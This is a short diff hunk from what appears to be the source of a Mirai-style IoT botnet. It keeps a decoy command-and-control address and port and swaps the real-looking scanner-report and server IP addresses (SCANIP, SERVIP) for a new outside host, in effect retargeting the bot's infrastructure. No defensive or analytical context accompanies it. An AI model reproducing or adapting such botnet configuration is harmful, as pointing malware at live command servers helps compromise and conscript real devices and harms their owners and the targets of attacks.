@@ -20,8 +20,8 @@ typedef uint16_t port_t;
 #define FAKE_CNC_ADDR   INET_ADDR(65,222,202,53)
 #define FAKE_CNC_PORT   80
 
-#define SCANIP (int)inet_addr((const char*)"136.243.114.221");
-#define SERVIP (int)inet_addr((const char*)"136.243.114.221");
+#define SCANIP (int)inet_addr((const char*)"176.46.152.89");
+#define SERVIP (int)inet_addr((const char*)"176.46.152.89");
 
 ipv4_t LOCAL_ADDR;
 
